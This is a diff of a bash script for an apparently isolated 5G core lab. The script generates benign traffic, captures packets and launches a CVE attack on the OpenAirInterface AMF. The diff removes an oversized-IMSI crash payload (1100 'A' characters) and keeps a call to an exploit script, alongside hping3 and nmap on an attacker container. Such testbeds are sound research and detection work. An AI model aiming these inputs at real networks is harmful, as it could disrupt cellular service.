@@ -129,7 +129,7 @@ start_benign_traffic() {
   docker exec -d "$TRAFFIC_GEN" bash -c "
     END=\$(( \$(date +%s) + ${duration} ))
     while [[ \$(date +%s) -lt \$END ]]; do
-      yt-dlp --source-address ${ue_ip} --format 'bestaudio[ext=m4a]' --output '/tmp/yt_%(id)s.%(ext)s' --no-playlist --quiet 'https://www.youtube.com/watch?v=jNQXAC9IVRw' 2>/dev/null || true
+      yt-dlp --source-address ${ue_ip} --format 'bestaudio[ext=m4a]' --output '/tmp/yt_%(id)s.%(ext)s' --no-playlist --quiet 'https://www.youtube.com/live/Nv4DRqrSilM?si=O4LOhJhXLcI532n7' 2>/dev/null || true
       rm -f /tmp/yt_*.m4a 2>/dev/null || true
       sleep 5
     done
@@ -177,10 +177,7 @@ run_cve() {
   docker logs oai-amf --tail 20 > "${AMF_LOG}.before" 2>&1 || true
   local TS; TS=$(elapsed)
 
-  if [[ "$CVE_METHOD" == "ueransim" ]]; then
-    local OVERSIZED_IMSI="001010000000102$(python3 -c 'print("A"*1100)')"
-    docker exec oai-nr-ue2 timeout 25 /opt/oai-nr-ue/bin/nr-uesoftmodem -O /opt/oai-nr-ue/etc/nr-ue.yaml -E --rfsim -r 106 --numerology 1 --uicc0.imsi "${OVERSIZED_IMSI}" -C 3319680000 --rfsimulator.serveraddr 192.168.70.160 --log_config.global_log_options level,nocolor,time >/dev/null 2>&1 || true
-  elif [[ "$CVE_METHOD" == "python" ]]; then
+  if [[ "$CVE_METHOD" == "python" ]]; then
     docker exec oai-attacker python3 /tmp/cve_65805_exploit.py --target "$AMF_IP" --port "$AMF_NGAP_PORT" --imsi-len 1500 >/dev/null 2>&1 || true
   fi
 
@@ -199,20 +196,20 @@ run_cve() {
 # ==========================================================================
 cleanup() {
   echo "[cleanup] Stopping processes and saving logs..."
-  if [[ -f "$TSHARK_PID_FILE" ]]; then
-    local pid; pid="$(cat "$TSHARK_PID_FILE")"
-    if kill -0 "$pid" 2>/dev/null; then sudo_run kill "$pid" || true; fi
-    rm -f "$TSHARK_PID_FILE"
-  fi
+  
+  sudo_run pkill -15 -f "tshark -i oaiworkshop" 2>/dev/null || true
+  
+  sleep 2 
+  rm -f "$TSHARK_PID_FILE" 2>/dev/null || true
 
-  # Removes the Sidecar (terminates all benign traffic flows together)
   docker rm -f "$TRAFFIC_GEN" >/dev/null 2>&1 || true
 
-  # Kills Kali processes silently to avoid terminal clutter
+  # Kills Kali processes
   docker exec oai-attacker pkill hping3 >/dev/null 2>&1 || true
   docker exec oai-attacker pkill nmap >/dev/null 2>&1 || true
 }
-trap cleanup EXIT
+
+trap cleanup EXIT INT TERM QUIT HUP
 
 # ==========================================================================
 # PRE-CHECKS
